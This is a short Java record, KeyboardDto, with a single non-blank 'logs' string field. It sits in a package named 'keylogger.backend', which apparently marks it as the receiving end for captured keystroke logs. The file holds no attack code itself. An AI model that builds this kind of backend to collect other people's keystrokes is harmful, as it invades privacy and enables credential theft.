package keylogger.backend.dtos;

import jakarta.validation.constraints.NotBlank;

public record KeyboardDto(
    @NotBlank(message = "Logs cannot be empty")
    String logs
) {}
